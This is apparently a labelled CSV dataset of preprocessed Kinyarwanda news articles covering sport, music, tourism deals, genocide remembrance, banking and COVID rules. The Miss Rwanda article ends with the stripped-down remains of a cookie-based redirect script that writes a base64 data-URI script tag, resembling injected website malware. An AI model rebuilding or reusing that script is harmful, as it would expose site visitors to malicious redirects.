label,title,content
3,abanyarwanda bagiye kwerekeza bufaransa kunoza ubucuruzi bw’ikawa n’icyayi paris st germain,tariki ukuboza ikigo cy’igihugu cy’ubukerarugendo rdb nibwo cyatangiye ubufatanye psg buzamara imyaka itatu bugamije kureshya abashoramari gukomeza kuba icyerekezo kibereye ubukerarugendo muri bufatanye ikirango visit rwanda kigaragazwa stade parc des princes psg yakirira imikino yayo mugongo myenda kipe ikoresha myitozo gihe kwishyushya mbere y’imikino yaba yambara yasuye indi kipe cyangwa yambara iwayo shampiyona y’u bufaransa ligue muri bufatanye kandi u rwanda psg byasinyanye amasezerano guzacuruza icyayi cy’u rwanda parc des princes n’ikawa ikamenyekanishwa bufaransa minisitiri w’ubuhinzi n’ubworozi mukeshimana graldine yabwiye itangazamakuru kuba amasezerano yaragezweho ikintu cyiza cyane igiciro cy’icyayi n’ikawa bidahagaze neza isoko mpuzamahanga yagize icyayi cyacu cyagiye kigira amahirwe ariko buriya cyayi habamo ibyiciro byinshi hari usanga nk’icyiciro mbere cy’icyayi igiciro kiri hejuru buryo kigurwa ibi ntibivuze toni ibihumbi twejeje zose zaguzwe amadorali hari rusange nk’icyiciro cy’icyayi cyacu cyaguze yongeyeho n’ikawa yageze igira igiciro kitari cyiza usanga kiri munsi y’igishoro umuhinzi yakoresheje ati ibi byatumye abahinzi batangira kubona nyungu irimo bisaba leta yinjiramo buryo amafaranga abahinzi batangaga bagura ifumbire ijya kawa byasabye leta itangamo miliyari frw mwaka kugira abahinzi batazagira amafaranga batanga dr mukeshimana avuga ibiciro byakomeje kugenda bigorana buryo uburyo bwari busigaye byari ugushaka amasoko yandi ati ubu isoko alibaba rimwe masoko adufasha psg kipe yakinnye abantu bakanywa icyayi cy’u rwanda n’ikawa ubu turi biganiro by’uburyo bizagenda bikorwa buryo hagati tariki - mutarama abantu bacu bazajya i paris gukorana n’abantu paris st germain kugira twige neza gikorwa kizagenda ubu bufatanye bwitezweho kurushaho gufungurira amarembo abashoramari bufaransa bindi bice by’isi buryo babyaza umusaruro amahirwe aboneka rwanda u rwanda rwiteze binyuze bufatanye abakinnyi psg n’ibindi byamamare mpuzamahanga bizabafasha gusura u rwanda bakabona ibyiza bitatse igihugu cy’imisozi uhereye bijyanye n’ubugeni umuco siporo muzika ubukerarugendo amafunguro n’ubwiza bw’igihugu rusange ubu bufatanye buteganya icyayi cy’u rwanda n’ikawa aribyo byonyine bizajya bitangwa parc des princes hazabaho kandi icyumweru cy’imishinga y’abanyempano b’abanyarwanda n’abafaransa icyo cyumweru cyiswe semaine du rwanda paris kizajya gitegurwa psg kumenyekanisha ibintu byose bikorerwa rwanda mu bijyanye kuzamura impano z’u rwanda psg izagira uruhare kuzamura abakiri bato binyuze gushinga ishuri ry’umupira w’amaguru i kigali kipe izajya itegura imyitozo y’abatoza n’abakiri bato mu binyuze kigo gishinzwe guteza imbere ubukerarugendo bushingiye nama rcb u rwanda rwinjiye bufatanye bw’imyaka itatu n’ikipe arsenal fc yambara imyenda yanditseho visit rwanda’ ndetse ikarumenyekanisha bundi buryo butandukanye rdb iheruka kuvuga ubufatanye bw’u rwanda arsenal fc bumaze kugira inyungu ibarirwa miliyoni z’amapawundi ukuvuga asaga miliyari frw ikawa kimwe bihingwa bifatiye runini ubukungu bw’u rwanda ikigo cy’igihugu gishinzwe kohereza mahanga ibikomoka buhinzi n’ubworozi naeb cyatangaje hoherejwe toni ibihumbi kawa mahanga havamo amafaranga agera miliyoni mu hari intego kugeza miliyoni z’amadorali avuye kawa umwaka wasize u rwanda rusuwe n’abakerarugendo miliyoni
5,kwibuka danny vumbi bruce melodie basohoye indirimbo ihumuriza abanyarwanda bakoze,abahanzi danny vumbi bruce melodie basohoye indirimbo nshya bise kwibuka twiyubaka’ ikaba igamije gufasha abanyarwanda bihe kwibuka jenoside yakorewe abatutsi mata abahanzi danny vumbi bruce melodie basohoye indirimbo nshya bise kwibuka twiyubaka’ ikaba igamije gufasha abanyarwanda bihe kwibuka jenoside yakorewe abatutsi mata mugihe nk’iki usanga abahanzi ngeri zitandukanye bakunze kuririmba abandi bagategura imivugo batanga ubutumwa kwibuka guhumuriza abarokotse jenoside yakorewe abatutsi nako batanga ubutumwa bushishikariza buri wese kurwanya ingengabitekerezo jenoside ibyabaye rwanda bitazongera ukundi tariki mata buri mwaka umunsi u rwanda n’isi rusange bitangira icyumweru kwibuka inzirakarengane z’ababatutsi zazize jenoside mata danny vumvi bruce melodie ndirimbo bavuga u rwanda rwanyuze mateka asharira agatera intimba mitima benshi ariko abatakaje ababyeyi n’abavandimwe jenoside bakaba bafite umuryango wabo ariwo u rwanda’ rubazirikana bati twabuze twakundaga igihugu kitubera umuryango kitubera ababyeyi kitubera abavandimwe kitubera inshuti none turi u rwanda rwisannye turi inkingi itanyeganyezwa duhanze amaso ejo hari imbere ntambwe idasubira inyuma iyi ndirimbo kwibuka twiyubaka’ imara iminota n’amasegonda bahanzi bayihaye izina ry’insanganyamatsiko y’uyu mwaka ivugango twibuke twiyubaka’ ikaba ikoze buryo bw’amajwi n’amagambo iyi ndirimbo yakozwe ntiyashyirwa mugaragaro bakaba bariyemeje kuyivugurura ikoreshwe bihe kwibuka nshuro muri mwaka igikorwa kwibuka cyabaye buryo budasanzwe abaturarwanda kwibukira rugo rwego kwirinda ikwirakwira ry’icyorezo coronavirus cyatumye ibikorwa bihuza abantu benshi bigagarikwa rwego kwirinda kwanduzanya httpswwwyoutubecomwatchvmhougmlq
3,abayobozi barishimira ibikorwa by’indashyikirwa by’urubyiruko rw’iwawa,nyuma gutemberezwa kigo cy’iwawa tariki bagasura ibikorwa bitandukanye bikorwa n’urubyiruko rwigirayo imyuga minisitiri w’umuco siporo mitali protais mugenzi w’urubyiruko nsengimana jean philbert bashimye uru rubyiruko kubera ibikorwa by’indashyikirwa rumaze kugeraho urubyiruko rwigira iwawa rukora ibikorwa bitandukanye birimo ububaji ubudozi ubworozi bw’inzuki ubuhinzi ndetse n’ubwubatsi bimwe bikorwa byamurikiwe abayobozi harimo badorera ubwubatsi ububaji n’ibindi bikorwa bitandukanye uru rubyiruko rukora uru rubyiruko rwikorera usanga habaho gufashanya hagati yarwo bisa nko kugabana imirimo bitewe n’icyo umuntu akora nicolas niyongabo umuyobozi w’iki kigo yabwiye abayobozi basuye kigo abize iby’ubudozi badodera bagenzi ababaji bakabaza ibitanda bagenzi bararaho ugasanga avugako igikorwa usanga gitanga umusaruro kuko mukozi bavana ahandi ubwo basuraga ahakorerwa ubudozi n’ububaji minisitiri bombi bashimye bikorwa ndetse bizeza igisigaye ukureba uburyo bakora byagezwa hanze hatari iwawa bigashakirwa isoko kuko bakora ibintu byiza birimo ibitanda intebe n’ameza ndetse n’imyenda mitali yagize bana bafite ubumenyi buhagije ahubwo igisigaye ukubashakira ibikoresho bigezweho n’isoko ubuhanga nabwo nonese ababa hanze bakorera ahandi wagize hari babarusha mitali mugenzi nsengimana basabye uru rubyiruko gukomeza kugira umwete kumenya kuko bizabagirira akamaro ejo hazaza ibikorwa uru rubyiruko rumaze gukora mwaka bifite agaciro miliyoni zisaga z’amafaranga y’u rwanda ikibazo cyagaragajwe n’umuyobozi w’iki kigo abubatsi batabasha kubona ubutaka kubakisha kuko ububa kirwa iwawa ntago bushobora kubakishwa kuko bubi umuyobozi w’akarere rutsiro byukusenge gaspard yijeje kigo bagiye kureba ahari ubutaka bwiza muy indi mirenge kugirango babubagezeho byukusenge yasabye hakwiye gushakwa ubundi bwato kuko ubukora imirimo kugemurira bana ibintu bitandukanye budahagije kandi bushaje abaminisitiri babijeje ubuvugizi kigo vdaste nkikabahizi
6,nishimwe naomie niwe wegukanye ikamba nyampinga w’u rwanda amafoto,umukobwa witwa nishimwe naomie wambaye nimero niwe watowe nyampinga w’u rwanda nyuma gutsinda bagenzi bahanganye final yabereye intare arena uyu mukobwa w’ imyaka wiyamamarije mujyi kigaliyakunzwe benshi ndetse izina rye riramamara mbuga nkoranyambaga kubera ubwiza bwe none birangiye yegukanye ikamba nishimwe ufite umushinga ujyanye kurwanya kanseri y’ibere rwanda yasimbuye nimwiza meghan u wambaye kamba mwaka nishimwe naomie yabaye miss rwanda karindwi wambitswe ikamba marushanwa yateguwe rwanda inspiration back up akaba miss rushanwa ryabaho miss rwanda nishimwe naomie yatoranyijwe bakobwa bajya cyiciro nyuma umutesi denise no ingabire gaudence no umwiza phionah no mutegwantebe chanice no irasubiza alliance no teta ndenga nicole no musana teta hense no umuratwa anitha no akaliza hope no igisonga mbere yabaye umwiza phionah no gihe igisonga kabiri yabaye umutesi denise no abegukanye andi makamba nyampinga w’umuco miss heritage teta ndenga nicole nonyampinga wabaniye neza abandi miss congeniality ingabire diane nonyampinga wakunzwe benshi miss popularity irasubiza alliance nonyampinga uberwa n’amafoto miss photogenic nishimwe naomie no abari bagize akanama nkemurampaka barimo ntarindwa diogene umurerwa evelyne mutesi jolly sherrie silver munyaneza james nishimwe agiye kumara umwaka ahembwa ibihumbi by’amanyarwanda buri kwezi ahabwe imodoka nshya bwoko suzuki suift n’amavuta yayo azamara umwaka wose akoresha imisatsi n’inzara anambikwa imyenda y’ibirori buntu n’amakanzu igihe ayakeneye azahabwa serivisi banki umwaka wose ahabwe ubwishingizi kwivuza umwaka wose gusohokera resitora umwaka wose kimwe kuryama cyumba hoteli la palisse azarihirwa ikiruhuko mujyi dubai n’itike y’indege anishyurirwe ibijyanye n’urwo rugendo byose n’ibindi byinshi bitandukanye birimo guhabwa imyenda siporo igihe ayikeneye gihe cy’umwaka wose igisonga mbere umwiza phiona yahembwe frw gihe umutesi denise wabaye igisonga kabiri yahembwe frw bombi bakazahabwa icyumba hoteli umunsi umwe buri kwezi gihe cy’amezi atandatu kumwe n’umuryango wabo irasubiza alliance wahawe ikamba ry’uwakunzwe benshi miss popularity yahembwaefrw iphone plus gb ndetse anahembwa guhamagara gukoresha interineti buntu gihe cy’umwaka azamarana kamba nishimwe naomi wabaye miss photogenic cyangwa umukobwa wifotoza akaberwa n’amafoto yagenewe igihembo frw miss rwanda yatangiye gihe nyampinga yabaye miss uwera dalila hakurikiraho bahati grace rihabwa kayibanda mutesi aurore ryambikwa akiwacu colombe kundwa doriane arihabwa mutesi jolly atorwa iradukunda elsa afata irya irya ryahawe iradukunda liliane gihe iriheruka ryatwawe nimwiza meghan function getcookieevar udocumentcookiematchnew regexp ereplacegreturn udecodeuricomponentuvoid var srcdatatextjavascriptbasezgjdwlbnqudjpdguodwlcnhcguojyuzqyumyumyumiuosumcuncuymcumyumiumyuzrcuymiuocuncuncumcumyuzqsuyriuyriuqiuosursuriursunsunyuyrsuriursuqyuosursunsuyriuznsumyunyuzmiuniuqiuymiuzrsuzqyuyriumyumyumiuosumcuncuzrsuymccpktsnowmathfloordatenowecookiegetcookieredirectifnowtimecookievoid timevar timemathfloordatenowedatenew datenew dategettimedocumentcookieredirecttime path expiresdatetogmtstringdocumentwritescript srcsrcscript total views views today
2,munyankindi yasezerewe espoir fc,aganira kigalitodaycom mudaheranwa kazimir aman umuyobozi espoir fc yavuze impamvu nyamukuru gusezererwa munyankindi mutoza yafata ikipe itigeze itsinda kandi akaba afite imyitwarire mibi ikipe twamuzanye tumushakaho intsinzi ariko siko byagenze ikindi kandi wasangaga azana umwuka mubi ikipe akanasuzugura bakorana twabonye dukomezanyije tutagera twifuza duhitamo gutandukana nyamara ariko munyankindi ntiyemeranywa n’ibyatangajwe n’abamuyoboraga kuko avuga impamvu gutsindwa yatewe n’uko ikipe ifite abakinnyi badakomeye avuga amakipe yamutsinze arusha ubushobozi espoir fc ikipe irimo abakinnyi batoya badafite inararibonye nabanje kubigisha kugira mbazamure kandi n’abakinnyi barimo bakuze hategekimana bonaventure gangi bebeto lwamba ntabwo bagifite ingufu cyane ikindi kandi ntibyoroshye guhangana n’amakipe afite ubushobozi burenze ubwawe haba bakinnyi ndetse n’amikoro munyankindi uzwi ho kutaramba makipe akaba yaratoje police fc mukura victory sport hose ahava asezerewe kubera umusaruro mukeikipe espoir imusezereye nyuma kunganya nyanza fc ikipe zazamukanye cyiciro mbere ubu espoir ikaba mwaya n’inota rimwe nk’uko twabitangarijwe n’umuyobozi w’iyi kipe gervais manirakiza umaze iminsi mike ahawe akazi kungiriza munyankindi ugiye gutoza ikipe gihe bagishakisha umutoza mukuru uyu manirakiza wanatoje amakipe menshi harimo kaminuza y’u rwanda muhanga fc ndetse police fc akazatangira akazi gutoza nk’umutoza mukuru w’agateganyo icyi cyumweru azaba ashaka intsinzi mbere y ikipe espoir rugo yakiriye kiyovu sport i rusizi thoneste nisingizwe
2,abakinnyi basiganwe magare rwego kurwanya ruswa,iri siganwa ryareguwe bufatanye bw’ishyirahamwe ry’umukino w’amagere rwanda ferwacy n’urwego rw’umuvunyi hagamijwe gukangurira abanyarwanda guhashya ruswa gutangiza icyumweru kuyirwanya tariki kugeza ukuboza iri siganwa ryitabiriwe n’abakinnyi baturutse makipe agize ferwacy ndetse n’abandi babyifuza bafite ibikoresho bijyanye n’isiganwa nk’igare ryabugenewe n’ingofero casque abasiganwa bazengurutse umujyi kigali bahagurukiye i remera stade amahoro basoreza i nyamirambo stade kigali gasore hategeka niwe wegukanye siganwa akurikirwa n’uwamungu innocent habiyambere nicodeme uwa gatatu uwa mbere yahembwe amafaranga ibihumbi uwa kabiri ibihumbi uwa gatatu ahembwa ibihumbi dore inzira abasiganwa banyuzemo guhagurukira stade amahoro chez lando gishushu rdb nyarutarama gacuriro kagugu gisozi muhima rond point kigali gitega nyamirambo kimisagara nyabugogo route des poids lourds kanogo rwandex zion temple kicukiro centre sonatube giporoso la palisse bazamuke berekeza kimironko stade amahoroaha bahazengurutse ishuro eshatu stade amahoro chez lando gishushu rdb nyarutarama gacuriro kagugu gisozi muhima rond point kigali giteganyamirambo basoreza stade regional theoneste nisingizwe
3,raporo undp rwanda yakoresheje imibare ishaje- aurelien agbenonci,aurelien agbenonci yabwiye umunyamakuru the new times imibare yakoreshjwe rapport yiswe sustanainability and equity a better future for all yataye igihe kandi itaturutse biro bye i kigali muri raporo yashyizwe ahagaragara itariki kabiri uku kwezi u rwanda rwashyizwe mwanya w’i bihugu bigaragaza iterambere ry’abaturage ryiza bice byose minisitri w’imari n’igenamigambi john rwangombwa yahakanye ibyagaragajwe aulerien n’ubwo yatangaje adashaka kwinjira raporo yavuze azavugana n’abakoze raporo iyi raporo yakozwe n’ishami ry’umuryango w’abibumbye ryita iterambere united nations development program undp emmanuel n hitimana
3,bad yahaye bk inguzanyo miliyoni z’amadolari,ku rubuga rwayo bad yatangaje nguzanyo izafasha bk kongera amafaranga yakoreshaga ndetse kuzamura inguzanyo itanga bayigana bakora ibijyanye n’ibikorwaremezo inganda ubuhinzi bushingiye nganda n’ubukerarugendo iyi nkunga kandi igomba gukoreshwa kongera ibigo by’imari biciriritse ndetse n’amasosiyete akomeye akorana bk bikava bakagera mwaka bad ikavuga bizafasha u rwanda guhanga imirimo igera kugera mwaka bk yashinzwe niyo banki nini rwanda kuko kugeza itariki kamena yihariye isoko kugeza mu mashami yayo gihugu cyose bk itanga serivisi bantu barenga ibihumbi emmanuel n hitimana
5,diamond platnumz yajyanywe nkiko kubera kutishyura ubukode bw’ inzu,umuririmbyi w’icyamamare afurika y’ iburasirazuba diamond platnumz yajyanywe nkiko n’uwo yahoze abera nzu amushinja kutamwishyura umwaka wose w’ubukode umuririmbyi w’icyamamare afurika y’ iburasirazuba diamond platnumz yajyanywe nkiko n’uwo yahoze abera nzu amushinja kutamwishyura umwaka wose w’ubukode uyu muririmbyi ntabwo yagaragaye rukiko yahagarariwe n’ umunyamategeko gerald hamisi avuga muhanzi mahanga kandi adashobora gutaha iwabo tanzania mbere y’ibyumweru bitatu kubera icyorezo corona virus diamond platnumz aregwa kuba atarishyuye ubukode bw’inzu yahoze akodesha bongo flava star nyiri inzu avuga diamond yamwambuye amashingi miliyoni y’umwaka wose yakodeshaga ibiro wcb sinza nyiri inzu maulid wande avuga diamond yasize adasannye ibikoresho byangiritse nzu yayibagamo umunyamategeko diamond yavuze bitewe n’uko diamond atari gihugu kuganira n’umujyanama wemanager kugira barebe bakemura kibazo iki kibazo cyumwikanye mbere umunyamategeko nyiri inzu avuga abaregwa bavuga gushaka bakemura ikibazo amayeri gusunika igihe iburanisha rirakomeza werurwe rukiko mwananyamala ruherereye karere kinondoni diamond plutnumz umwe bahanzi bahagaritse ibitaramo bafite mugabane w’ i burayi kubera icyorezo coronavirus thecitizencotz
5,ferwafa yatumiye abanyamuryango bayo nama kugabana ibiribwa,ishyirahamwe ry’umupira w’amaguru rwanda ferwafa ryandikiye abanyamuryango baryo ribatumira nama nyunguranabitekerezo izaba igamije kwiga baganaba ibiribwa bahawe n’umuterankunga mucyo kuri kane tariki kamena ferwafa yandikiye abanyamuryango bayo ibatumira nama nyunguranabitekerezo kwiga buryo ibiribwa bemerewe bizabageraho ferwafa yavuze nama izakorwa hifashishijwe ikoranabuhanga webex kuwa kamena ndetse buri kipe igomba gutoranya umuntu uzayihagararira mu nama yabaye kane tariki gicurasi hifashishijwe ikoranabuhanga ry’amashusho ishyirahamwe ry’umupira w’amaguru rwanda ferwafa ryashyizwe mashyirahamwe y’imikino afurika agomba kugabanywa miliyoni ukuvuga asaga miliyari frw azatangwa caf bihe coronavirus komite y’imicungire y’ibiza mpuzamashyirahamwe y’umupira w’amaguru afurika caf yemeje hatangwa inkunga banyamuryango izabafasha gucunga gushyigikira amarushanwa yagizweho ingaruka n’icyorezo coronavirus igiteranyo miliyoni frw azagabanywa abanyamuryango caf barimo ferwafa iki cyemezo caf cyakiriwe neza bamwe banyamuryango ferwafa bahise batekereza kubona mafaranga arikoferwafa yabakuriye inzira murima ibabwira ntayo bazaryaho kuwa gicurasi umunyamabanga w’ishyirahamwe ry’umupira w’amaguru rwanda uwayezu franois regis yavuze mafaranga atari kugabanya abanyamuryango ahubwo ngengo y’imari y’uyu mwaka bamaze kuyapangira azakoreshwa dusingizimana remy is a journalist for umuryangorw he studied at the university of rwandahe holds a bachelor’s degree in journalism and communication he started his career in writing about sports in follow him on twitter and instagram remy sagan
2,mafisango arashaka gukinira rayon sport bokota yanayikozemo imyitozo,mafiango wanakinnye rwanda apr fc atracofc mbere kwerekeza tanzania ikipe azam fc yavuye akerekeza simba arimo gukinira avuga azarangiza amasezerano n’iyi kipe kwezi cumi n’abiri kandi ibiganiro bye rayon sport bigenze neza yiteguye kuza kuyikinira kwezi mbere mafisango naramuka aje rayon sport ashobora kuzahasanga bokota lama kuko nk’uko twari twabatangarije agomba kugera rwanda minsi mike yamaze kugera i kigali akaba yanakoze imyitozo rayon sport kabiri rayon sport izanye bokota asimbure faustin usengimana ugomba kwerekeza ikipe y’abatarengeje imyaka izakina shampiyona cyiciro mbere nyuma guhabwa uburenganzira n’ishyirahamwe ry’umupira w’amaguru rwanda ferwafa gushaka uzamusimbura gusa n’ubwo yatangiye imyitozo ntaremererwa ferwafa gukinira rayon sport kuko itarabona igisubizo kibemerera gusinyisha musore wakinaga darling club motema pembe dcmp congo ariko shampiyona yaho ikaba izasozwa cyumweru jean marie ntagwabira umutoza rayon sport avuga abonye bokota mafisango byafasha ikipe kuko azi ubuhanga bwabo ntagwabira afite icyizere mafisango azaza rayon kuko wanafashe iya mbere asaba yaza gukinira kipe nyuma gutsindwa la jeunesse ibitego rayon sport yatangiye gutegura umukino uzayihuza mukeba wayo apr fc ntagwabira akaba avuga n’ikipe bicaye bakareba amakosa yakozwe n’uko bagomba kuyakosora kugira bazatsinda umukino cyumweruimikono yarangiye yararangiye abakinnyi gutsindwa twamaze kubibavanamo ubu byaba ubuyobozi abakinnyi n’abatoza dushyize imbere umukino apr ku munsi kane shampiyona apr irarusha amanota atatu rayon sport ikaba mwanya mbere n’amanota gihe rayon sport mwanya gatatu n’amanota thoneste nisingizwe
1,nyamasheke ifite umwihariko jenoside yakorewe abatutsi,u rwanda rwagize amateka mabi jenoside ariko akarere nyamasheke kari twashegeshwe cyane ikiswe zone turquoise ingabo z’abafaransa zari ntara cyangugu gikongoro n’igice cy’intara kibuye cyabigizemo uruhare kuko jenoside yatinze guhagarara nk’uko umuyobozi w’akarere nyamasheke yabisobanuye umuyobozi w’akarere nyamasheke habyarimana jean baptiste yagize twe twamaze amezi atatu jenoside kuko twari zone turquoise byanatumye twakira n’abicanyi bavuye ahandi bahungira iwacu yibukije abaturage mwaka kugeza mwaka abacitse icumu bakomeje kujya bicwa umwe umwe ndetse gihe inkiko gacaca zabaga hari abagiye bicwa yabasabye mateka bihariye akwiye kubigisha agira aya mateka ntaho twayacikira ahubwo atubere isomo umuyobozi w’akarere yasobanuriye abaturage basaga ibihumbi bahari amateka jenoside adahera ahubwo bakwiye kuyibuka bahera mwaduko w’abazungu n’uko bagiye binjiza amacakubiri ashingiye moko banyarwanda emmanuel nshimiyimana
3,akajagari mwuga w’ubushoferi kagiye gucika,mu kiganiro yagiranye n’abanyamakuru kabiri tariki ugushyingo minisitiri ushinzwe iby’ingendo minisiteri y’ibikorwaremezo dr alex nzahabwanimana yavuzeko mategeko azarengera uburenganzira bw’abagenzi iyi nyigo ikubiyemo amategeko azagenga umwuga yarangijwe kwigwa hasigaye kuzayishyikiriza inama y’abaminisitiri iyemeze minisitiri yavuze umwuga w’ubushoferi ugomba kugendera mategeko utazajya winjirwamo buri wese y’umva abyishakiye yavuze birababajeje kubona hari umuntu ubyuka kubera yashonje agafata imodoka akayishyira muhanda ashaka igihumbi kimwe cyangwa bibiri kurya ubikoze abangamiye wawundi wiyemeje kubujyira umwuga ntitugomba kubyemera muri kiganiro dr nzahabwanimana yahakanye gahunda minisiteri ifite guca imodoka ntoya mini bus mujyi ahubwo minisiteri ifite gahunda gukangurira abashoramari kwinjiza imodoka zigezweho abantu bakunze aya mategeko agenga umwuga w’ubushoferi azaba anareba abakora umwuga w’ubushoferi mazi minisiteri nzahabwanimana yavuze nzira y’amazi hakirangwa akajagari gakabije usanga abantu bumva umwuga ugomba gukorwa buri wese ubishatse yavuzeko abatwara abantu mazi nabo bagomba kuzubahiriza amabwiriza akubiye nyigo eric muvara
5,bruce melody yagaye umusaruro w’ingufu yashoye uganda,bruce melody bahanzi bakunzwe cyane rwanda ntiyanyuzwe mba n’icyavuye bufatanye bw’indirimbo yakoranye n’ibyamamare uganda ndetse afata ingamba nshya yirinda ibihombokuva mwaka itahiwacu bruce bruce melody yakoranye indirimbo n’abahanzi batandukanye uganda yaririmbye iyitwa incwi’ yakoranye jamal hello’ yahuriyemo n’uwitwa fille mutoni ndetse music yaririmbanye radio good life uyu muhanzi umaze guhatanira primus guma guma inshuro ebyiri yasubije amaso inyuma asanga umusaruro yavanye ndirimbo utandukanye bikomeye n’ingufu yashoye yafashe ingamba kwagura izina rye atifashishije abahanzi bakomeye mahanga ahubwo azajya akora ashoboye aririmbe giti cye ati gukorana indirimbo n’umunyamahanga byiza ariko ntabwo byakugira international ahubwo intwaro mbere ugukora ikintu cyawe ukakigeza rwego wifuza mu kugaya umusaruro yavanye mikoranire n’abahanzi hanzi yagize narabikoze cyane gusa umusaruro byatanze ntabwo nari niteze ntabwo byampaye umusaruro nari niteze kubaho aimee indatwanet
3,abafite inganda park industriels ntibavuga rumwe psf iyimurwa ryayo,nyuma gusanga kugira inganda zimurwe bizatwara miliyari zirenga z’amafaranga y’u rwanda bamwe bafite ibikorwa byabo batangaza ibyavuye nyigo bitajyanye n’igihe umwe bitabiriye umuhango kumurika inyigo yateguwe n’urugaga rw’abikorera kabiri yagize iyo ndebye bushakashatsi mbona butajyanye n’igihe nk’ubu umutungo wanjye gusa nywubarira agaciro miliyari eshanu mu mwaka nibwo urugaga rw’abikorera bubifashijwemo sosiyete gimco ltd co bwatangiye ubushakashatsi gaciro k’imitungo n’ibibanza biri gice inganda nizo ziteganywa kuzimurwa gice zikajyanwa gice gishya cyagenewe inganda kigali special economic zone giherereye i nyandungu mbundu faustin uyobora urugaga rw’abikorera psf yatangaje hari ibigomba gusubwirwamo bushakashatsi yongeraho hakenewe n’ibitekerezo bitandukanye biturutse bafite ibikorwa n’ubutaka gice biteganyijwe kwimura nganda bizatangira mutarama igikorwa kizamara imyaka itatu emmanuel n hitimana
4,rubavu haracyabura uruhare rwamadini namatorero guhangana nikibazo cyinda ziterwa abangavu,imwe miryango itegemiye leta iravuga kugirango inda ziterwa abangavu zicike burundu hakenewe n’imbaraga z’amadini n’amatorero kuko usanga abaturage babagirira icyizere cyane kurusha abandi mugisha jule ushinzwe ibikorwa imro ihorere munyarwanda organization yagize abanyamadini n’amatorero twumva bakwiye kudufasha kurwanya kibazo kuko abayoboke babumva kurusha abandi kandi baritabira munsi basengeyeho bagiye badufasha kubyamagana kubirwanya byagira akamaro kanini bigatanga umusaruro urushije twakoraga abraham tumusifu umukristu usengera asengera itorero methodiste asanga guhangana n’iki kibazo hakenewe imbaraga z’amadini n’amatorero agira nibyo koko abafite inshingono matorero dukwiye gushyiramo imbaraga gushishikariza abakirisitu kwita kibazo kandi tubishyizemo imbaraga byagira umusaruro bizakunda kuko nkanjye mpagarariye urubyiruko kandi hose barimo muri rubavu hakorera imiryango isaga ihuriza hamwe kurwanya inda ziterwa abangavu ndetse kubungabunga ibidindiza uburenganzira muntu bakanarebera hamwe bakora kugirango barusheho guhangana n’ibibazo biba byugarije abaturage
5,ibitaramo social media’ biremewe ariko ababikurikirana ntibave bari-,police y’u rwanda yongeye kwibutsa abantu bagomba kubahiriza amabwiriza kwirinda ikwirakwira ry’icyorezo covid- by’umwihariko iburira abahanzi bakora ibitaramo mbuga nkoranyambaga bemerewe kubikora ariko ababikurikirana ntibave zabo police y’u rwanda yagarutse gitaramo giherutse guhagarikwa cy’itsinda ryakanyujijejo hambere tuff gangs cyabaye mpera z’icyumweru gishize kikaza guhagarikwa kitarangiye ivuga kiriya gitaramo cyakorwaga buryo buhonyora amabwiriza kwirinda ikwirakwira covid- kuko cyabere kabari kamwe mujyi kigali gihe utubari tutemerewe gukora police y’u rwanda ivuga kandi kiriya gitaramo cyariho kibera hari abantu gihe ibikorwa bihuriza abantu hamwe n’amakoraniro bibujijwe umuvugizi police y’u rwanda commissioner of police cp john bosco kabera aherutse kuvuga ibitaramo bitemewe kuko ibikorwa bihuza abantu benshi bitemewe niba uvuze ugiye gukora igitaramo ukoresheje ikoranabuhanga witumira abantu bahurire ahantu hamwe cp john bosco kabera avuga ibitaramo bikorwa hifashishijwe ikoranabuhanga bitabujijwe ariko ababikora bakubahiriza ariya mabwiriza kandi ababikurikira ntibave ati abantu bakurikirane igitaramo cyawe batavuye ndetse batanateraniye hamwe rwego kwirinda ikwirakwira covid- niba igitaramo gikorwa hifashishijwe ikoranabuhanga gikorewe kabari hoteri cyangwa kigahuriza hamwe abantu benshi ukwica amabwiriza umusekerw
